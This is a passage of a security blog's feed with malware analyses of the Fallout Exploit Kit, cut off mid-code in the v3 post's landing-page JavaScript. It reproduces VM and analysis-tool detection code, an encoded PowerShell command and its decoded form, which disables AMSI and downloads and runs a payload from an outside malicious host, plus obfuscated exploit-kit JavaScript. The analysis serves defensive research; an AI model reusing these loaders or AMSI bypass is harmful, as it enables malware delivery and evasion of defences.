<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">zz_vm_detect</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">_EAX</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">cpuid</span> <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="process-detection">Process Detection</h3>
<p>Get a list of running processes.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/03.jpg" /></p>

<p>Convert process name to lower case.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">zz_tolowercase</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">a1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&lt;=</span> <span class="mi">90</span> <span class="p">)</span>
      <span class="o">*</span><span class="n">a1</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
    <span class="o">++</span><span class="n">a1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compare to the following hashes.
Once again, It uses the dualaccModFFF1Hash algorithm.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x3F5406DE
0x25CD0541
0x0F050309
0x161803EC
0x19F3044B
</code></pre></div></div>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/04.jpg" /></p>

<p>Two process names were identified. I do not know the others.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"wireshark.exe"</span><span class="p">))</span>
<span class="s">'0x25cd0541'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"fiddler.exe"</span><span class="p">))</span>
<span class="s">'0x19f3044b'</span>
</code></pre></div></div>

<p>Like v3, shellcode downloads, decodes and executes encrypted PowerShell code.</p>

<h2 id="powershell">PowerShell</h2>
<p>The PowerShell code to be executed is like this.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-noni</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">dAByAHkAewAkAGwAMQBJAGwAMQA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQA7ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAD0AJABsADEASQBsADEALgBHAGUAdABUAHkAcABlACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFUAMwBsAHoAZABHAFYAdABMAGsAMQBoAGIAbQBGAG4AWgBXADEAbABiAG4AUQB1AFEAWABWADAAYgAyADEAaABkAEcAbAB2AGIAaQA1AEIAYgBYAE4AcABWAFgAUgBwAGIASABNAD0AJwApACkAKQA7ACQASQAxAEkAbAAxADEAbAAxAEkAbAA9ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAC4ARwBlAHQARgBpAGUAbABkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFkAVwAxAHoAYQBVAGwAdQBhAFgAUgBHAFkAVwBsAHMAWgBXAFEAPQAnACkAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAkAEkAMQBJAGwAMQAxAGwAMQBJAGwALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AH0AYwBhAHQAYwBoAHsAfQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAIgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQB7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAEkAbABJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABJAGwAMQBJADEASQBJADEAbAA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAEkASQBsAEkASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbAAxADEAMQBsAEkAbAAxAEkAMQBJADsAfQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABsAEkAMQBsAGwAMQBJAGwAMQBJADEAbAB7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAGwASQA7AHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABJAGwAMQBsADEAOwBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABJADEAbABsADsAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAEkAbAAxADEAMQBJAEkASQBsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQAxAGwASQBsADEAbABsADEASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbABJAEkASQBsADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAGwAMQAxAEkAbABsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQBsADEASQBsAEkAbAAxADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJAGwASQBJAEkAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAEkAMQBsAEkAbABJADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJADEAbAAxADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABJAGwAbAAxAEkAbAA7AHAAdQBiAGwAaQBjACAAcwBoAG8AcgB0ACAASQBsAEkASQAxADsAcAB1AGIAbABpAGMAIABzAGgAbwByAHQAIABJAGwAbABJAGwAbAA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABsAGwASQBsAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbAAxAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbABJAGwAbABsAEkAMQBJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAASQAxAEkASQBJADsAfQA7AHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABsADEASQBsADEAMQBJAEkASQB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAiACwAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoAHMAdAByAGkAbgBnACAASQBJAGwASQBJAEkALABzAHQAcgBpAG4AZwAgAEkAbABJAGwASQAsAEkAbgB0AFAAdAByACAASQAxADEAbAAxAEkALABJAG4AdABQAHQAcgAgAGwAMQBsAEkAMQAsAGIAbwBvAGwAIABJAGwASQAxADEASQBJADEAMQAxADEALAB1AGkAbgB0ACAAbAAxADEAMQBJACwASQBuAHQAUAB0AHIAIABsAEkASQBJADEASQBsAGwASQAsAHMAdAByAGkAbgBnACAASQAxAEkAbAAxAGwASQAsAHIAZQBmACAAbABJADEAbABsADEASQBsADEASQAxAGwAIABsAGwAMQAxAEkASQBsADEASQAsAG8AdQB0ACAASQAxAGwASQBJADEASQBsADEAIABsAEkASQAxAEkASQApADsAfQAiADsAJABsAGwAbAAxAEkAbABsAEkAMQA9ACIAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwATABvAHcAXAAkACgALQBqAG8AaQBuACgAKAA0ADgALgAuADUANwApACsAKAA2ADUALgAuADkAMAApACsAKAA5ADcALgAuADEAMgAyACkAfABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBDAG8AdQBuAHQAIAA4AHwAJQB7AFsAYwBoAGEAcgBdACQAXwB9ACkAKQAuAHQAbQBwACIAOwAkAEkAMQBsADEAMQBJADEAPQAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAaABlAHIAbwA0AHUALgBjAG8AbQAvADEAOQA1ADAALQAwADEALQAxADEALwBPADgAWgByACcAOwBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgBHAE4AcwBhAFQAMABvAFQAbQBWADMATABVADkAaQBhAG0AVgBqAGQAQwBCAE8AWgBYAFEAdQBWADIAVgBpAFEAMgB4AHAAWgBXADUAMABLAFQAcwBrAFkAMgB4AHAATABrAGgAbABZAFcAUgBsAGMAbgBOAGIASgAxAFYAegBaAFgASQB0AFEAVwBkAGwAYgBuAFEAbgBYAFQAMABuAFMAagBVADMAVQBEAGwANQBNAFcAawB6AE0ARQAwAHgATQBEAEoAWQBOAFMAYwA3AEoARwBOAHMAYQBTADUARQBiADMAZAB1AGIARwA5AGgAWgBFAFoAcABiAEcAVQBvAEoARQBrAHgAYgBEAEUAeABTAFQARQBzAEoARwB4AHMAYgBEAEYASgBiAEcAeABKAE0AUwBrADcAJwApACkAfABpAGUAeAA7ACQASQAxAEkAMQBsADEASQBJAGwAbABJADEAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbABJADEAbABsADEASQBsADEASQAxAGwAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBsAEkASQAxAD0AMAB4ADAAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBJAEkAbABJAD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAUwBpAHoAZQBPAGYAKAAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACkAOwAkAEkASQBsADEASQBsADEASQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQA7AFsAbAAxAEkAbAAxADEASQBJAEkAXQA6ADoAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoACQAbABsAGwAMQBJAGwAbABJADEALAAkAGwAbABsADEASQBsAGwASQAxACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAJABmAGEAbABzAGUALAAwAHgAMAAwADAAMAAwADAAMAA4ACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIgBjADoAIgAsAFsAcgBlAGYAXQAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACwAWwByAGUAZgBdACQASQBJAGwAMQBJAGwAMQBJACkAfABvAHUAdAAtAG4AdQBsAGwAOwA</span><span class="o">=</span><span class="w">
</span></code></pre></div></div>

<p>Let’s decode and clean.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$l1Il1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="p">;</span><span class="w">
    </span><span class="nv">$l1Il1lI1IIl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1lI1IIl</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s2">"amsiInitFailed"</span><span class="p">,</span><span class="w"> </span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$true</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">};</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="s2">"using System;using System.Diagnostics;using System.Runtime.InteropServices;[StructLayout(LayoutKind.Sequential)]public struct I1lII1Il1{public IntPtr IIlI1;public IntPtr lIl1I1II1l;public uint IIIIIlII;public uint Il111lIl1I1I;}[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct lI1ll1Il1I1l{public uint IIIlI;public string Il1l1;public string lI1ll;public string Il111IIIl;public uint I1lIl1ll1I;public uint IlIIIl1;public uint ll11Ill;public uint Il1IlIl1;public uint lIlIII;public uint lI1lIlI;public uint lI1l11;public uint Ill1Il;public short IlII1;public short IllIll;public IntPtr llIlIlIlI;public IntPtr Ill1IlIlI;public IntPtr IllIlllI1I1;public IntPtr I1III;};public static class l1Il11III{[DllImport(""kernel32.dll"",SetLastError=true)]public static extern bool CreateProcess(string IIlIII,string IlIlI,IntPtr I11l1I,IntPtr l1lI1,bool IlI11II1111,uint l111I,IntPtr lIII1IllI,string I1Il1lI,ref lI1ll1Il1I1l ll11IIl1I,out I1lII1Il1 lII1II);}"</span><span class="p">;</span><span class="w">

</span><span class="nv">$lll1IllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\AppData\LocalLow\</span><span class="si">$(</span><span class="o">-join</span><span class="p">((</span><span class="mi">48</span><span class="o">..</span><span class="mi">57</span><span class="si">)</span><span class="s2">+(65..90)+(97..122)|Get-Random -Count 8|%{[char]</span><span class="bp">$_</span><span class="s2">})).tmp"</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1l11I1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://beahero4u.com/1950-01-11/O8Zr'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">);</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="n">Headers</span><span class="p">[</span><span class="s1">'User-Agent'</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'J57P9y1i30M102X5'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$I1l11I1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">lI1ll1Il1I1l</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IlII1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IIIlI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$I1I1l1IIllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$IIl1Il1I</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">I1lII1Il1</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">l1Il11III</span><span class="p">]::</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00000008</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="s2">"c:"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$I1I1l1IIllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$IIl1Il1I</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">out-null</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>Thus the malware is downloaded and executed.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Fallout has been heavily updated, making analysis very difficult. Very sophisticated techniques such as Diffie-Hellman key exchange, VM detection, process detection, etc. are used. We need to be careful as they may be updated in the future.</p>
]]></content:encoded>
<pubDate>2019-07-09T15:00:00+00:00</pubDate>
</item>
<item>
<title>Analysis of Fallout Exploit Kit v3</title>
<link>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</link>
<guid>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We already tweeted, but the Fallout Exploit Kit has been updated. In the new Fallout, the traffic chain, obfuscation method of landing page and shellcode are changing. We will introduce details on the changes using <a href="http://malware-traffic-analysis.net/2019/02/28/index.html">Malware-Traffic-Analysis.net’s saz file</a>.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">New <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a> is using PoC on GitHub!<br />(CC: <a href="https://twitter.com/kafeine?ref_src=twsrc%5Etfw">@kafeine</a>, <a href="https://twitter.com/jeromesegura?ref_src=twsrc%5Etfw">@jeromesegura</a>, <a href="https://twitter.com/malware_traffic?ref_src=twsrc%5Etfw">@malware_traffic</a>)<a href="https://t.co/L1J5QOwJWn">https://t.co/L1J5QOwJWn</a><a href="https://t.co/ehhwtQqC5j">https://t.co/ehhwtQqC5j</a><a href="https://t.co/7opIhvSxg4">https://t.co/7opIhvSxg4</a> <a href="https://t.co/sJ1ESYpxbv">pic.twitter.com/sJ1ESYpxbv</a></p>&mdash; nao_sec (@nao_sec) <a href="https://twitter.com/nao_sec/status/1100931219242442752?ref_src=twsrc%5Etfw">2019年2月28日</a></blockquote>


<h2 id="traffic">Traffic</h2>
<p>As usual HookAds Campaign will reach the landing page of Fallout and the attack will start. The flow of traffic is like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<h2 id="landing-page">Landing Page</h2>
<p>Let’s read the JavaScript on the landing page. Firstly, the objects necessary for decoding are defined.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">OygitP9</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">fZ2S0q</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">cMa5g</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span><span class="p">,</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">p2Z2Fkoy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">P1mnrrMi834</span><span class="p">(</span><span class="nx">MQVCd</span><span class="p">);</span> <span class="nx">p2Z2Fkoy</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">b8j5WMF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">negriNm4A3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">negriNm4A3</span><span class="p">)</span> <span class="p">?</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span> <span class="p">:</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span><span class="p">),</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">m3Z1Kc</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">T82SkC</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">OcKyWsdOFyq</span>
    <span class="p">},</span>
    <span class="na">jbRyz</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">[^</span><span class="sr">A-Za-z0-9</span><span class="se">\+\/\=]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span 